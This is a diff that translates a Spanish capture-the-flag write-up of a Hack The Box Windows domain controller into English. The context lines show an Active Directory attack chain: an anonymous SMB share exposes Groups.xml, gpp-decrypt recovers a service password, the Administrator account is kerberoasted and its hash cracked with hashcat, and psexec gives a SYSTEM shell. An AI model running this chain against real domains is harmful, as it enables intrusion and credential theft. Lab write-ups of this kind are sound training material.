@@ -2,7 +2,7 @@
 
 # Enumeration
 
->Comenzamos con un escaneo de puertos empleando el script de escaneo automático de puertos TCP creado por mí:
+>We started with a port scan using the TCP auto port scan script created by me:
 
 ```bash
 ┌──(kali㉿jbkira)-[~]
@@ -42,7 +42,7 @@ Puertos TCP abiertos:
 
 ```
 
->Enumeramos la versión de Windows y el nombre del dominio mediante la herramienta crackmapexec:
+>We list the Windows version and domain name using the crackmapexec tool:
 
 ```bash
 ┌──(kali㉿jbkira)-[~]
@@ -51,7 +51,7 @@ SMB         10.129.234.109  445    DC               [*] Windows 7 / Server 2008 
 
 ```
 
->Agregamos el dominio encontrado al /etc/hosts para que el equipo pueda resolver el nombre de dominio empleando el resolutor local:
+>We added the found domain to the /etc/hosts so that the computer can resolve the domain name using the local resolver:
 
 ```bash
 ┌──(kali㉿jbkira)-[~]
@@ -59,7 +59,7 @@ SMB         10.129.234.109  445    DC               [*] Windows 7 / Server 2008 
 
 ```
 
->No se puede loguear de forma anónima en el RPC y realizar llamadas:
+>Unable to log anonymously into the RPC and make calls:
 
 ```bash
 ┌──(kali㉿jbkira)-[~]
@@ -70,7 +70,7 @@ rpcclient $> exit
 
 ```
 
->Vemos que logueandonos de forma anónima mediante SMB hay recursos compartidos disponibles, en concreto tenemos permisos de lectura en uno:
+>We see that by logging in anonymously through SMB there are shared resources available, specifically we have read permissions in one:
 
 ```bash
 ┌──(kali㉿jbkira)-[~]
@@ -90,7 +90,7 @@ SMB         10.129.234.109  445    DC               Users
 
 ```
 
->En esta share podemos ver un archivo Groups.xml que parece interesante, así que nos lo llevamos:
+>In this share we can see an Groups.xml file that looks interesting, so we take it with us:
 
 ```bash
 ┌──(kali㉿jbkira)-[~]
@@ -118,7 +118,7 @@ getting file \active.htb\Policies\{31B2F340-016D-11D2-945F-00C04FB984F9}\MACHINE
 
 ```
 
->En este archivo podemos ver lo que parece una contraseña para el usuario SVC_TGS:
+>In this file we can see what a password looks like for user SVC_TGS:
 
 ```bash
 ┌──(kali㉿jbkira)-[~]
@@ -128,14 +128,14 @@ getting file \active.htb\Policies\{31B2F340-016D-11D2-945F-00C04FB984F9}\MACHINE
 </Groups>
 ```
 
->Esta contraseña está encriptada con GPP por lo que podremos facilmente desencriptarla con el siguiente comando:
+>This password is encrypted with GPP so we can easily decrypt it with the following command:
 
 ```bash
 gpp-decrypt edBSHOwhZLTjt/QS9FeIcJ83mjWA98gw9guKOhJOdcqh+ZGMeXOsQbCpZ3xUjTLfCuNH8pG5aSVYdYw/NglVmQ
 GPPstillStandingStrong2k18
 ```
 
->Comprobando las credenciales con crackmapexec vemos que son válidas:
+>Checking the credentials with crackmapexec we see that they are valid:
 
 ```bash
 ┌──(kali㉿jbkira)-[~]
@@ -144,7 +144,7 @@ SMB         10.129.234.109  445    DC               [*] Windows 7 / Server 2008 
 SMB         10.129.234.109  445    DC               [+] active.htb\SVC_TGS:GPPstillStandingStrong2k18
 ```
 
->Si tratamos de hacer un kerberoast veremos que la cuenta Administrator es kerberoasteable:
+>If we try to do a kerberoast we will see that the Administrator account is kerberoasteable:
 
 ```bash
 ┌──(kali㉿jbkira)-[~]
@@ -157,7 +157,7 @@ active/CIFS:445       Administrator  CN=Group Policy Creator Owners,CN=Users,DC=
 
 ```
 
->Por lo que vamos a pedir el ticket TGS:
+>So we are going to ask for the TGS ticket:
 
 ```bash
 ┌──(kali㉿jbkira)-[~]
@@ -174,7 +174,7 @@ active/CIFS:445       Administrator  CN=Group Policy Creator Owners,CN=Users,DC=
 $krb5tgs$23$*Administrator$ACTIVE.HTB$active.htb/Administrator*$d26a0548c4f9595c0417812e6c392d6a$b250a05ae1de24e46780f39025c7995d6c9c54f0d5aadd63709065030c52c2001fa4a5d8e981ceed194674bb02d9ffea5ad1e43bee99b7e3b5db6d922ff033a2064951080457d077db55726dda8f8ceb314389d1f3232415925437775371109066268a7c17a0695791b395e5e8e4c1408a9d377e870cd5e27a56fe0258c82280357a54edf88a3afaafbc7e0725173753fc1ac9225dd67b537776489236dfb3954b0a75887a1f3edff406591499cafa014a72caac0e3b914d588db6eb34f866a5d1877bdc682d56bc5b3ff6e233281317fdd6b6dab996ac3d15a218fc6077af6d70b81d9252eee17e619f01078f810653cbeebf6d5d6a286915979bccad2a1ccc237e98df9b8635f4d3133d8da9d3b6e49c3939345c151ab0c884d2430b272fafd13e3fd36a7f5d8ed5a7e618fbaa1b588d9fb59e8f67328cd234bf8e10eda82c67a6f750d7a5e81312eedf8058d2052cc975b9d7ad72405b5083690d27ce6d2d0e90a91b65f25c411928b26ba4ad19dbd8963f76a40688e4b5d17ffc006f0c7e48bd4f45b36b06506ecd0ca22e4a96dffa26ff1f73ceef34d1ed85ae03bd4a2d87bfb08a6c469dbb08f87ba1d320f344d664a2dc841c6a8b0c1c7eda480db60b1f1876899c211d67d5fa257e8a2de4163865bb8a72b719b92c1165c4f1991bb92497fc28e464b3074e35987af4f262108264171547841bf7f33d33ddefa557061fbb7c758319bd68721b49c32f66350e4b45244eea26e03e58916b18bdcf505b43d6353a8e1779318d184c1caa62d3a0f51278f4d87497e3c878e3c66123f1d087bfb9a3ef7e35cbddfa628d2b2773b71611e4b19cf17666aee71d77f513ccec22451ce7e8d95893b540cf3d7c92fc0ff95415d52f123ee457b23a9f4632a9fb93b2f152f1e73265b4723c1f4edba0b1938d742a36fc3017e22d3716c00e587994929f53041435441015fe4ed6eac4de6a39164d01801e09d1b2600f6427cbbe9aec042d7f832bb4f32f5220efb1c1378ee6bb3f663fce8a489398b086dc8a6ec92076408aa6869374c1884837cb9be23588c04a6a0e07b1111b3364adcf4e86a991c57245426148aa089fd55a7fab5eb1c2024e71b81cd2278584fc995592976891a4011c91af054f567ad6e7ca65d5fc4c32a7632e98fe24dcd14ee989bb6136e8df7bd2201dd4189c2ae2a15c2a99ca845eedf1f7a29748321954c9c66157848ff7bf29333137feb75e414aa25516b1be1b2fa1d9380fc344
 ```
 
->Vamos a meterlo en un archivo y tratar de crackearlo offline con hashcat empleando la máscara 13100 que corresponde a los hashes KRB5TGS de tipo 23 (`$krb5tgs$23$`):
+>Let's put it in a file and try to crack it offline with hashcat using the mask 13100 that corresponds to the KRB5TGS type 23 hashes (`$krb5tgs$23$`):
 
 ```bash
 ┌──(kali㉿jbkira)-[~]
@@ -187,7 +187,7 @@ $krb5tgs$23$*Administrator$ACTIVE.HTB$active.htb/Administrator*$d26a0548c4f9595c
 
 ```
 
->Vamos a probar las credenciales que acabamos de encontrar:
+>Let's test the credentials we just found:
 
 ```bash
 ┌──(kali㉿jbkira)-[~]
@@ -196,7 +196,7 @@ SMB         10.129.234.109  445    DC               [*] Windows 7 / Server 2008 
 SMB         10.129.234.109  445    DC               [+] active.htb\Administrator:Ticketmaster1968 (Pwn3d!)
 ```
 
->Vamos a ganar una shell como SYSTEM mediante psexec de la suite de Impacket empleando las credenciales encontradas:
+>We are going to win a shell like SYSTEM using psexec from the Impacket suite using the credentials found:
 
 ```bash
 ┌──(kali㉿jbkira)-[~]
@@ -218,7 +218,7 @@ C:\Windows\system32> whoami
 nt authority\system
 ```
 
->En los siguientes directorios podemos ver las flags:
+>In the following directories we can see the flags:
 
 ```bash
 C:\Users\Administrator\Desktop> dir
